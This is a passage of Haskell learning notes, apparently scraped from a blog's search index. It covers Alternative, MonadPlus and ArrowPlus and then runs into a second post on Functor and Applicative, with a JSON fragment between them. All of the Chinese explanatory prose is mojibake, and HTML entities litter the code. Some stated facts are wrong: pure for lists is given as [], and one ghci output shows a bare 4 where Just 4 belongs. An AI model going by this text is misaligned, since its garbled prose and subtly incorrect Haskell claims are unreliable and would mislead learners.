classesApplicativeã€Monadã€Arrowéƒ½æœ‰æœ‰å¹ºåŠç¾¤æ€§è´¨çš„å­ç±»å‹ç±»ï¼Œåˆ†åˆ«æ˜¯Alternativeã€MonadPlusã€ArrowPlus Alternative12345678910class Applicative f =&gt; Alternative f where -- | The identity of '&lt;|&gt;' empty :: f a -- | An associative binary operation (&lt;|&gt;) :: f a -&gt; f a -&gt; f a some :: f a -&gt; f [a] some v = (:) &lt;$&gt; v &lt;*&gt; many v many :: f a -&gt; f [a] many v = some v &lt;|&gt; pure [] å…¶ä¸­emptyæ˜¯å¹ºåŠç¾¤ä¸­çš„å•ä½å…ƒç´ ï¼Œ&lt;|&gt;æ˜¯å¹ºåŠç¾¤ä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚someå’Œmanyæ˜¯ä¸¤ä¸ªå‡½æ•°ï¼ˆæ„ä¹‰è¿˜ä¸æ‡‚ï¼‰ Alternativeå®ä¾‹[]123instance Alternative [] where empty = [] (&lt;|&gt;) = (++) å’ŒMonoidä¸€æ ·ï¼Œå•ä½å…ƒç´ æ˜¯ç©ºåˆ—è¡¨ï¼ŒäºŒå…ƒè¿ç®—æ˜¯åˆ—è¡¨åˆå¹¶ 123456ghci&gt; [1,2,3] &lt;|&gt; empty &lt;|&gt; [4,5][1,2,3,4,5]ghci&gt; some [][]ghci&gt; many [][[]] Maybe1234instance Alternative Maybe where empty = Nothing Nothing &lt;|&gt; r = r l &lt;|&gt; _ = l Maybeä½œä¸ºAlternativeçš„å•ä½å…ƒç´ æ˜¯Nothingï¼ŒäºŒå…ƒè¿ç®—æ˜¯å§‹ç»ˆå–å·¦è¾¹ï¼ˆå½“å·¦è¾¹ä¸ä¸ºNothingæ—¶ï¼‰ 123456ghci&gt; Nothing &lt;|&gt; Just 1 &lt;|&gt; Just 2 Just 1 ghci&gt; some NothingNothing ghci&gt; many Nothing Just [] ZipList123instance Alternative ZipList where empty = ZipList [] ZipList xs &lt;|&gt; ZipList ys = ZipList (xs ++ drop (length xs) ys) 1234&lt;&gt;getZipList $ ZipList [1,2] &lt;|&gt; ZipList [3,4,5,6][1,2,5,6]&lt;&gt;getZipList $ ZipList [1,2,3,4] &lt;|&gt; ZipList [3,4,5,6][1,2,3,4] Alternative Laws Monoid laws: 123empty &lt;|&gt; x = x x &lt;|&gt; empty = x (x &lt;|&gt; y) &lt;|&gt; z = x &lt;|&gt; (y &lt;|&gt; z) Left zero lawï¼šempty &lt;*&gt; f = emptyä»¥ä¸Šçš„å®šå¾‹æ˜¯éƒ½æ»¡è¶³éƒ½ï¼Œä¸‹é¢çš„å®šå¾‹åªæœ‰éƒ¨åˆ†æ»¡è¶³ï¼š Right zero lawï¼šf &lt;*&gt; empty = empty ï¼ˆå¤§éƒ¨åˆ†åŒ…æ‹¬Maybeã€[]æ»¡è¶³ï¼ŒIOä¸æ»¡è¶³ï¼‰ Left distributionï¼š(a &lt;|&gt; b) &lt;*&gt; c = (a &lt;*&gt; c) &lt;|&gt; (b &lt;*&gt; c) ï¼ˆMaybeã€[]æ»¡è¶³ï¼ŒIOåŠå¤§éƒ¨åˆ†parsersä¸æ»¡è¶³ï¼‰ Right distributionï¼ša &lt;*&gt; (b &lt;|&gt; c) = (a &lt;*&gt; b) &lt;|&gt; (a &lt;*&gt; c) ï¼ˆå¤§éƒ¨åˆ†ä¸æ»¡è¶³ï¼Œä½†Maybeæ»¡è¶³ï¼‰ Left catchï¼š(pure a) &lt;|&gt; x = pure a ï¼ˆMaybeã€IOã€parsersæ»¡è¶³ï¼Œä½†[]ä¸æ»¡è¶³ï¼‰ å¸¸ç”¨å‡½æ•° asum :: (Foldable t, Alternative f) =&gt; t (f a) -&gt; f aï¼Œç›¸å½“äºfoldr (&lt;|&gt;) emptyï¼š 1234ghci&gt; asum [Nothing, Just 5, Just 3]Just 5ghci&gt; asum [[2],[3],[4,5]][2,3,4,5] guard :: (Alternative f) =&gt; Bool -&gt; f ()ï¼š 12guard True = pure ()guard False = empty MonadPlus123456class (Alternative m, Monad m) =&gt; MonadPlus m where mzero :: m a mzero = empty mplus :: m a -&gt; m a -&gt; m a mplus = (&lt;|&gt;) MonadPluså®ä¾‹[]ã€Maybeéƒ½æ˜¯MonadPlusçš„å®ä¾‹ï¼Œmzeroå’Œmpluséƒ½ç”±Alternativeå®ç° MonadPlus Laws Monoid laws Left zeroï¼šmzero &gt;&gt;= f = mzero Right zeroï¼šm &gt;&gt; mzero = mzero å¸¸ç”¨å‡½æ•° msum = asum mfilterï¼š 123mfilter p ma = do a &lt;- ma if p a then return a else mzero ArrowPlusArrowZeroå’ŒArrowPlusåˆ†åˆ«ä¸ºArrowè®¾ç½®äº†Monoidä¸­çš„å•ä½å…ƒç´ å’ŒäºŒå…ƒè¿ç®—ç¬¦ï¼Œä½¿ä¹‹æˆä¸ºäº†ä¸€ä¸ªå¹ºåŠç¾¤ï¼š 12345class Arrow arr =&gt; ArrowZero arr where zeroArrow :: b `arr` cclass ArrowZero arr =&gt; ArrowPlus arr where (&lt;+&gt;) :: (b `arr` c) -&gt; (b `arr` c) -&gt; (b `arr` c) Reference Typeclassopedia - Haskell wiki Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ8ï¼‰Monoid - zwvista Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ16ï¼‰Alternative - zwvista ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/d4bb2633.html"},{"title":"ã€ŒLearn Haskellã€#5 å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­","text":"&lt; #4 #6 &gt; Functorså‡½å­ï¼ˆFunctorï¼‰æ˜¯ä¸€ä¸ªç±»å‹ç±»ï¼ˆtypeclassï¼‰ï¼Œå’Œå…¶ä»–ç±»å‹ç±»ä¸€æ ·ï¼Œå®ƒè§„å®šäº†å…¶å®ä¾‹ç±»å¿…é¡»å®ç°çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚Eqç±»å‹ç±»è§„å®šäº†å®ƒçš„å®ä¾‹å¿…é¡»æ˜¯å¯ä»¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰çš„ï¼‰ï¼ŒFunctorè§„å®šç±»å®ƒçš„å®ä¾‹å¿…é¡»æ˜¯å¯ä»¥è¿›è¡Œæ˜ å°„çš„ã€‚Functorè¦æ±‚ä½¿ç”¨fmap :: (a -&gt; b) -&gt; f a -&gt; f b å‡½æ•°æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªa -&gt; bç±»å‹çš„å‡½æ•°ã€ä¸€ä¸ªå†…éƒ¨å…ƒç´ ä¸ºaç±»å‹çš„å‡½å­ï¼Œè¿”å›ä¸€ä¸ªå†…éƒ¨å…ƒç´ ä¸ºbç±»å‹çš„å‡½å­ Functorå¯ä»¥æ¯”ä½œç›’å­ï¼Œé‚£fmapå‡½æ•°å°±ç›¸å½“äºç»™å®šä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªç›’å­ï¼Œå°†ç›’å­ä¸­çš„å…¨éƒ¨å…ƒç´ éƒ½åº”ç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è¿”å›åº”ç”¨å‡½æ•°åçš„ç›’å­ å‡½å­çš„å®ä¾‹å¿…é¡»æ˜¯ä¸€ä¸ªKindä¸º* -&gt; *çš„ç±»å‹æ„é€ å™¨ï¼Œå› ä¸ºå®ƒè¦æ±‚å…¶æ˜¯ä¸€ä¸ªç›’å­ï¼Œç›’å­åœ¨æ¥æ”¶å†…å®¹åæ‰ä¼šæˆä¸ºä¸€ä¸ªå…·ä½“çš„ç±»å‹ã€‚fmapä¸­çš„f aå’Œf bä¹Ÿæ˜¯å› ä¸ºfæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œåœ¨æ¥æ”¶ç±»å‹a/båæ‰ä¼šå˜æˆä¸€ä¸ªå…·ä½“ç±»å‹ï¼ˆf aå’Œf bï¼‰å‡ºç°åœ¨å‡½æ•°ç±»å‹å£°æ˜ä¸­ Functorçš„å®šä¹‰æ˜¯: 1234class Functor f where fmap :: (a -&gt; b) -&gt; f a -&gt; f b (&lt;$) :: a -&gt; f a -&gt; f b (&lt;$) = fmap . const å¯ä»¥å‘ç°Functorä¸ä»…éœ€è¦fmapå‡½æ•°ï¼Œè¿˜éœ€è¦ä¸€ä¸ª&lt;$å‡½æ•°ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªaç±»å‹çš„å˜é‡å’Œä¸€ä¸ªå†…å®¹ä¸ºbç±»å‹çš„å‡½å­ï¼Œè¿”å›ä¸€ä¸ªå†…å®¹ä¸ºaç±»å‹çš„å‡½å­ï¼›ä½œç”¨å°±æ˜¯å°†ä¼ å…¥çš„å‡½å­ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ›¿æ¢ä¸ºä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¯”å¦‚ï¼š 12ghci&gt; 'a' &lt;$ [1, 2, 3]&quot;aaa&quot; ä½†å®ƒä¸æ˜¯å£°æ˜ä¸€ä¸ªå‡½å­å®ä¾‹å¿…é¡»çš„ï¼Œå› ä¸ºå®ƒå¯ä»¥ä½¿ç”¨fmapå’Œconstå‡½æ•°å¤åˆæ¥å®ç°ï¼Œå…¶ä¸­constçš„ç±»å‹ç­¾åï¼š const :: a -> b -> a å³æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä½†å§‹ç»ˆåªè¿”å›ç¬¬ä¸€ä¸ªå‚æ•° Functorå®ä¾‹[]åˆ—è¡¨[]æ˜¯ä¸€ä¸ªå‡½å­ï¼Œå®ƒé€šè¿‡mapå‡½æ•°æ¥å®ç°fmapçš„åŠŸèƒ½ï¼š 12instance Functor [] where fmap = map map :: (a -> b) -> [a] -> [b] mapå’Œfmapè¦æ±‚çš„ç›¸åŒï¼Œè¾¾æˆçš„ç›®çš„ä¹Ÿä¸€è‡´ã€‚mapæ¥æ”¶ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªåˆ—è¡¨ï¼Œå®ƒä¼šå°†åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½åº”ç”¨è¿™ä¸ªå‡½æ•°åå†è¿”å›è¿™ä¸ªåˆ—è¡¨ MaybeMaybeä¹Ÿå…·æœ‰kind * -&gt; *ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼š 12345678instance Functor Maybe where fmap f Nothing = Nothing fmap f (Just x) = Just (f x)ghci&gt; fmap (*2) NothingNothingghci&gt; fmap (*2) (Just 2)Just 4 Either aEitherçš„kindæ˜¯* -&gt; * -&gt; *ï¼Œæ˜¾ç„¶å®ƒä¸æ˜¯å‡½å­ï¼Œä½†æ˜¯å›ºå®šäº†ä¸€ä¸ªä¼ å…¥ç±»å‹çš„Either açš„kindæ˜¯* -&gt; *ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼š 12345678instance Functor (Either a) where fmap f (Left x) = Left x fmap f (Right x) = Right (f x)ghci&gt; fmap (*2) (Left 4)Left 4ghci&gt; fmap (*2) (Right 4)Right 8 å› ä¸ºä½¿ç”¨Eitheræ—¶ä¸€èˆ¬ç”¨å³å€¼è¡¨ç¤ºæ­£å¸¸ç»“æœï¼Œå·¦å€¼è¡¨ç¤ºå¼‚å¸¸ä¿¡æ¯ï¼Œæ‰€ä»¥ä½¿ç”¨fmapæ—¶åªå¯¹å³å€¼è¿›è¡Œæ“ä½œï¼Œå¦‚æœæ—¶å·¦å€¼åˆ™ä¿æŒä¸å˜ï¼ˆè€Œä¸”å·¦å€¼æ­¤æ—¶ä¹Ÿä½œä¸ºç¡®å®šç±»å‹ç¡®å®šå€¼å­˜åœ¨ï¼‰ IOIOä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼Œä½¿ç”¨fmapå¯¹IOä¸­å†…å®¹åº”ç”¨å‡½æ•°ï¼š 12345678instance Functor IO where fmap f action = do result &lt;- action return (f result)ghci&gt; fmap (&quot;input: &quot;++) getLinetest&quot;input: test&quot; (,) a(,)è¡¨ç¤ºä¸€ä¸ªäºŒå…ƒç»„çš„ç±»å‹æ„é€ å™¨ï¼Œ(,) :: * -&gt; * -&gt; *ï¼Œè€Œç¡®å®šäº†ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç±»å‹åå°±å˜æˆäº†(,) aï¼Œå®ƒçš„kindæ˜¯* -&gt; *ã€‚ä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼Œè¿›è¡Œfmapå‡½æ•°æ—¶åªå¯¹ç¬¬äºŒä¸ªå…ƒç´ åº”ç”¨ï¼š 12instance Functor ((,) a) where fmap f (x, y) = (x, f y) åªå‰©ä¸€ä¸ªå…ƒç´ çš„ä¸‰å…ƒç»„å’Œå››å…ƒç»„ä¹Ÿéƒ½æ˜¯å‡½å­ï¼Œfmapä¹Ÿåªå¯¹æœ€åä¸€ä¸ªå…ƒç´ åº”ç”¨ï¼š 12345instance Functor ((,,) a b) where fmap f (a, b, c) = (a, b, f c)instance Functor ((,,,) a b c) where fmap f (a, b, c, d) = (a, b, c, f d) (-&gt;) r-&gt;ä¹Ÿæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œå®ƒçš„kindï¼š (->) :: * -> * -> * ä¸€ä¸ªæ˜ å°„ï¼ˆä¸€å…ƒå‡½æ•°ï¼‰çš„ç±»å‹a -&gt; bä¹Ÿå¯ä»¥å†™æˆ(-&gt;) a bï¼Œå®ƒæ˜¯ç”±ç±»å‹aå’Œç±»å‹bè¾“å…¥åˆ°ç±»å‹æ„é€ å™¨-&gt;ä¸­åå½¢æˆçš„ä¸€ä¸ªå…·ä½“ç±»å‹ã€‚æ‰€ä»¥ç¡®å®šäº†è¾“å…¥ç±»å‹åçš„ä¸€å…ƒå‡½æ•°çš„ç±»å‹å°±æ˜¯(-&gt;) rï¼ˆå…¶ä¸­ræ˜¯è¾“å…¥çš„ç±»å‹ï¼‰ è§„å®šçš„fmapçš„ç±»å‹ç­¾åæ˜¯ï¼š fmap :: (a -> b) -> f a -> f b å…¶ä¸­çš„fæ˜¯å‡½å­ï¼Œè€Œåœ¨è¿™ä¸ªå®ä¾‹ä¸­(-&gt;) rå°±æ˜¯å‡½å­ï¼Œå°†å…¶å¸¦å…¥få¯ä»¥å¾—åˆ°ï¼š fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b) æŠŠå…¶ä¸­çš„(-&gt;)æ¢æˆä¸­ç¼€å¯ä»¥å¾—åˆ°ï¼š fmap :: (a -> b) -> (r -> a) -> (r -> b) ä¼ å…¥ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªç±»å‹ä¸ºa -&gt; bï¼Œä¸€ä¸ªç±»å‹ä¸ºr -&gt; aï¼Œè¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œç±»å‹ä¸ºr -&gt; bã€‚ä¸éš¾æ¨æµ‹è¿™ä¸ªfmapæ˜¯å°†è¿™ä¸¤ä¸ªå‡½æ•°å¤åˆäº†ï¼Œå…ˆå¯¹è¾“å…¥å¯¹råº”ç”¨ç¬¬äºŒä¸ªå‡½æ•°äº§ç”Ÿç±»å‹açš„ç»“æœï¼Œç„¶ååœ¨åº”ç”¨ç¬¬ä¸€ä¸ªå‡½æ•°äº§ç”Ÿç±»å‹bçš„ç»“æœï¼Œæ‰€ä»¥(-&gt;) rå®šä¹‰çš„fmapæ˜¯ï¼š 12instance Functor ((-&gt;) r) where fmap f g = (\\x -&gt; f (g x)) æ‰€ä»¥(-&gt;) rçš„fmapå…¶å®å°±æ˜¯å‡½æ•°å¤åˆ(.)ï¼š 12instance Functor ((-&gt;) r) where fmap = (.) 12345678ghci&gt; :t fmap (*3) (+100) fmap (*3) (+100) :: (Num a) =&gt; a -&gt; a ghci&gt; fmap (*3) (+100) 1 303 ghci&gt; (*3) `fmap` (+100) $ 1 303 ghci&gt; (*3) . (+100) $ 1 303 Functor Lawsæ‰€æœ‰çš„å‡½å­éƒ½åº”è¯¥æ»¡è¶³ä¸¤ä¸ªå®šå¾‹ã€‚è¿™ä¸¤ä¸ªå®šå¾‹ä¸æ˜¯Haskellå¼ºåˆ¶è¦æ±‚çš„ï¼Œä½†åº”è¯¥ç¡®ä¿ä¸€ä¸ªå‡½å­æ»¡è¶³è¿™ä¸¤ä¸ªå®šå¾‹ï¼š fmap id = idï¼ˆå…¶ä¸­idä¸ºå‡½æ•°(\\x -&gt; x)ï¼‰ï¼šå³å¯¹ä¸€ä¸ªå‡½å­fmap idï¼Œé‚£å®ƒåº”è¯¥è¿”å›æœ¬èº«ï¼ˆfmap id a = id a = aï¼Œaä¸ºä¸€ä¸ªå‡½å­ï¼‰ï¼Œæ¯”å¦‚ï¼š 1234ghci&gt; fmap id [1, 2, 3][1,2,3]ghci&gt; fmap id (Just 2)Just 2 fmap (f . g) = fmap f . fmap gï¼šå³å‡½å­çš„fmapæ”¯æŒç»“åˆå¾‹ fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)ï¼Œå…¶ä¸­aä¸ºä¸€ä¸ªå‡½å­ fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x)) 12ghci&gt; fmap ((*3) . (+100)) (Just 1)Just 303 æ»¡è¶³ç¬¬ä¸€ä¸ªå®šå¾‹çš„å‡½å­ä¸€å®šæ»¡è¶³ç¬¬äºŒä¸ªå®šå¾‹ï¼Œæ‰€ä»¥åªè¦æ£€æŸ¥å‡½å­æ˜¯å¦æ»¡è¶³ç¬¬ä¸€ä¸ªå®šå¾‹å³å¯ Intuitionå¯¹äºå‡½å­å’Œfmapï¼Œæœ‰ä¸¤ç§ç†è§£æ–¹æ³• å‡½å­æ˜¯ä¸€ç§å®¹å™¨ï¼ˆcontainerï¼‰ï¼›fmapæ¥æ”¶ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å®¹å™¨å†…éƒ¨åº”ç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿”å›åº”ç”¨åçš„æ–°å®¹å™¨ å‡½å­æ˜¯ä¸€ç§è®¡ç®—ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰ï¼›fmapæ˜¯æŸ¯é‡ŒåŒ–çš„ï¼ŒæŠŠå…¶ç±»å‹ç­¾åçœ‹ä½œfmap :: (a -> b) -> (f a -> f b) æ¥æ”¶ä¸€ä¸ªå‡½æ•°è¿”å›å¦ä¸€ä¸ªå‡½æ•°ï¼Œä¼ å…¥å‡½æ•°g :: a -> bï¼Œfmapå°†å…¶è½¬æ¢ä¸ºæ–°çš„å‡½æ•° fmap g :: f a -> f b ä½¿æ™®é€šçš„å‡½æ•°gå¯ä»¥åœ¨è®¡ç®—ä¸Šä¸‹æ–‡fä¸­ä½¿ç”¨ï¼Œè¿™ç§è½¬æ¢ä¹Ÿè¢«ç§°ä¸ºæå‡ï¼ˆliftï¼‰ å¸¸ç”¨å‡½æ•°&lt;$&gt;&lt;$&gt;å‡½æ•°æ˜¯fmapçš„ä¸­ç¼€å½¢å¼ï¼ˆå®ƒçœ‹ç€ç±»ä¼¼$ï¼Œf $ 3å°†fåº”ç”¨åœ¨å•ä¸ªå€¼3ä¸Šï¼Œè€Œf &lt;$&gt; [1, 2, 3]å°†fåº”ç”¨åœ¨ä¸€ä¸ªå‡½å­ä¸Šï¼Œä¹Ÿå°±æ˜¯åº”ç”¨åœ¨ä¸€ä¸ªå‡½å­å†…éƒ¨çš„æ‰€æœ‰å€¼ä¸Šï¼‰ï¼š 1234ghci&gt; fmap (*2) (Just 2)4ghci&gt; (*2) &lt;$&gt; Just 24 $&gt;$&gt;å‡½æ•°åŒ…å«åœ¨Data.Functoræ¨¡å—ä¸­ ($>) :: Functor f => f a -> b -> f b Functorå®šä¹‰æ—¶è¦æ±‚äº†&lt;$å‡½æ•°ï¼Œå°†å‡½å­å†…éƒ¨çš„å…ƒç´ å…¨éƒ¨æ›¿æ¢ä¸ºæŒ‡å®šçš„æŸä¸ªå€¼ï¼Œè€Œ$&gt;æ­£å¥½å°†&lt;$å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°åäº†è¿‡æ¥ï¼Œç›¸å½“äºflip (&lt;$)ï¼š 1234ghci&gt; 'a' &lt;$ [1, 2, 3]&quot;aaa&quot;ghci&gt; [1, 2, 3] $&gt; 'a'&quot;aaa&quot; voidvoidå‡½æ•°ä¹ŸåŒ…å«åœ¨Data.Functoræ¨¡å—ä¸­ void :: Functor f => f a -> f () voidå‡½æ•°æŠŠä¸€ä¸ªå‡½å­å†…éƒ¨çš„å…¨éƒ¨å…ƒç´ éƒ½å˜æˆç©ºï¼ˆ()ï¼‰ï¼Œvoid xç›¸å½“äº() &lt;$ xï¼š 1234ghci&gt; void [1, 2, 3][(), (), ()]ghci&gt; void (Just 2)Just () Applicative Functoråº”ç”¨å‡½å­ï¼ˆApplicative Functorï¼‰æ˜¯å‡½å­çš„å‡çº§ç‰ˆï¼Œå®ƒåŒ…å«åœ¨Control.Applicativeæ¨¡å—ä¸­ã€‚ fmapè¿›è¡Œçš„æ“ä½œæ˜¯å°†ä¸€ä¸ªæ™®é€šä¸€å…ƒå‡½æ•°åº”ç”¨åœ¨ä¸€ä¸ªå‡½å­å†…éƒ¨ã€‚è€Œå¦‚æœè¦å°†ä¸€ä¸ªåŒ…å«å‡½æ•°çš„å‡½å­åº”ç”¨åœ¨å¦ä¸€ä¸ªå‡½å­ä¸Šï¼Œfmapå°±å¤„ç†ä¸äº†äº†ï¼Œä½†æ˜¯åº”ç”¨å‡½å­çš„æ–¹æ³•å¯ä»¥å¤„ç†ã€‚åº”ç”¨å‡½å­çš„å®šä¹‰ï¼š 123class Functor f =&gt; Applicative f where pure :: a -&gt; f a (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b åº”ç”¨å‡½å­è¦æ±‚å®ç°ä¸¤ä¸ªå‡½æ•°ï¼š pure :: a -&gt; f aï¼Œä¸éš¾ç†è§£ï¼Œpureæ¥æ”¶ä¸€ä¸ªå€¼ï¼Œå¹¶å°†å…¶æ”¾åœ¨é»˜è®¤çš„ä¸Šä¸‹æ–‡/å®¹å™¨ä¸­ã€‚å¯¹äºåˆ—è¡¨ï¼Œpure = []ï¼›å¯¹äºMaybeï¼Œpure = Just &lt;*&gt; :: f (a -&gt; b) -&gt; f a -&gt; f bï¼Œç±»ä¼¼äºfmap :: (a -&gt; b) -&gt; f a -&gt; f bï¼Œä½†ä¸åŒçš„æ˜¯&lt;*&gt;çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹æ˜¯f (a -&gt; b)ä¸æ˜¯a -&gt; bã€‚æ‰€ä»¥&lt;*&gt;çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å‡½æ•°ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ã€‚æ¢å¥è¯è¯´ï¼Œ&lt;*&gt;æ¥æ”¶ä¸€ä¸ªè£…æœ‰å‡½æ•°çš„å‡½å­å’Œå¦ä¸€ä¸ªå‡½å­ï¼Œåº”ç”¨å‡½æ•°åè¿”å›æ–°çš„å‡½å­ã€‚ Applicative Functorå®ä¾‹MaybeMaybeæ˜¯ä¸€ä¸ªåº”ç”¨å‡½å­ï¼š 1234instance Applicative Maybe where pure = Just Nothing &lt;*&gt; _ = Nothing (Just f) &lt;*&gt; something = fmap f something pureå‡½æ•°ï¼šå°†ä¸€ä¸ªå€¼æ”¾åœ¨é»˜è®¤çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè€Œå¯¹äºMaybeï¼Œé»˜è®¤çš„ä¸Šä¸‹æ–‡å°±æ˜¯Justï¼Œæ‰€ä»¥pure x = Just x &lt;*&gt;å‡½æ•°ï¼šå°†è£…æœ‰å‡½æ•°çš„å‡½å­ä¸­çš„å‡½æ•°åº”ç”¨å¦ä¸€ä¸ªå‡½å­ä¸­ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Nothingï¼Œå³ç¬¬ä¸€ä¸ªå‡½å­ä¸åŒ…å«å‡½æ•°ï¼Œé‚£è¿”å›çš„ç»“æœå°±ä¹Ÿä¼šæ˜¯Nothing ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è£…æœ‰å‡½æ•°fçš„å‡½å­Just fï¼Œå°†å…¶ä¸­çš„å‡½æ•°fåº”ç”¨åœ¨å‡½å­somethingä¸­ï¼Œåªéœ€è¦å°†fæå–å‡ºæ¥ä½¿ç”¨fmapåº”ç”¨åœ¨å‡½å­somethingä¸­å³å¯ å®é™…åº”ç”¨çš„ä¾‹å­ï¼š 12345678ghci&gt; Just (+3) &lt;*&gt; Just 9Just 12ghci&gt; pure (+3) &lt;*&gt; Just 9Just 12ghci&gt; (+3) &lt;$&gt; Just 9Just 12ghci&gt; Nothing &lt;*&gt; Just 9Nothing ç¬¬ä¸€ä¸ªä¾‹å­ï¼ŒJust (+3)æ˜¯ä¸€ä¸ªåŒ…å«å‡½æ•°(+3)çš„å‡½å­ï¼Œå°†å…¶åº”ç”¨åœ¨å‡½å­Just 9ä¸­ï¼Œå°†Just (+3)ä¸­çš„å‡½æ•°(+3)æå–å‡ºæ¥ï¼Œåº”ç”¨åœ¨Just 9ä¸­ï¼Œå¾—åˆ°äº†Just 12 ç¬¬äºŒä¸ªä¾‹å­ï¼Œå¯ä»¥å‘ç°ï¼Œåœ¨è¿™é‡Œpure (+3)å’ŒJust (+3)ç­‰æ•ˆï¼Œå› ä¸ºpureå°†å‡½æ•°(+3)æ”¾åœ¨é»˜è®¤ä¸Šä¸‹æ–‡ä¸­ï¼Œä¹Ÿå°±æ˜¯Justä¸­äº† è€Œ&lt;*&gt;èƒ½åšçš„ä¸æ­¢è¿™äº›ï¼Œä»–å¯ä»¥è¿ç»­ä¼ å…¥æ›´å¤šå‡½å­ä½œä¸ºå‚æ•°ï¼Œæ¯”å¦‚ï¼š 1234ghci&gt; pure (+) &lt;*&gt; Just 3 &lt;*&gt; Just 9Just 12ghci&gt; pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3 &lt;*&gt; Just 4 &lt;*&gt; Just 5Just 12 &lt;*&gt;å‡½æ•°ä¸€æ ·æ˜¯é»˜è®¤å·¦ç»“åˆçš„ï¼Œpure (+) &lt;*&gt; Just 3 &lt;*&gt; Just 9ç›¸å½“äº(pure (+) &lt;*&gt; Just 3) &lt;*&gt; Just 9ï¼Œè€Œpure (+) &lt;*&gt; Just 3å°†(+)åº”ç”¨åœ¨Just 3ä¸Šï¼Œå¾—åˆ°çš„å°±æ˜¯Just (+3)ä¸€ä¸ªåŒ…å«å‡½æ•°çš„å‡½å­ï¼Œåˆå°†å…¶é€šè¿‡&lt;*&gt;åº”ç”¨åœ¨äº†Just 9ä¸Šï¼Œå¾—åˆ°äº†Just 12: 12345 pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3 &lt;*&gt; Just 4 &lt;*&gt; Just 5= (pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3) &lt;*&gt; Just 4 &lt;*&gt; Just 5= (Just (\\y z -&gt; 3 + y + z) &lt;*&gt; Just 4) &lt;*&gt; Just 5= Just (\\z -&gt; 3 + 4 + z) &lt;*&gt; Just 5 = Just (+7) &lt;*&gt; Just 5= Just 12 æ‰€ä»¥å¯ä»¥ä½¿ç”¨ç±»ä¼¼pure f &lt;*&gt; x &lt;*&gt; y &lt;*&gt; â€¦æ¥å°†ä¸€ä¸ªæ™®é€šå¤šå…ƒå‡½æ•°fåº”ç”¨åœ¨å¤šä¸ªå‡½å­ä¸Šã€‚ è€Œä¸”pure f &lt;*&gt; xå®é™…ä¸Šå…ˆå°†æ™®é€šå‡½æ•°fæ”¾åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶åæ‰§è¡Œ&lt;*&gt;æ—¶å†å°†å…¶æå–å‡ºæ¥æ‰§è¡Œfmapï¼Œæ‰€ä»¥å®ƒå°±ç›¸å½“äºå°†æ™®é€šå‡½æ•°åº”ç”¨åœ¨å‡½å­xä¸Šï¼Œå³fmap f xï¼Œä¹Ÿå¯ä»¥å†™æˆf &lt;$&gt; xã€‚æ‰€ä»¥å¸¸ç”¨çš„å†™æ³•å°±æ˜¯ï¼š f x y ... []åˆ—è¡¨ä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨å‡½å­ï¼š 123instance Applicative [] where pure x = [x] fs &lt;*&gt; xs = [f x | f &lt;- fs, x &lt;- xs] 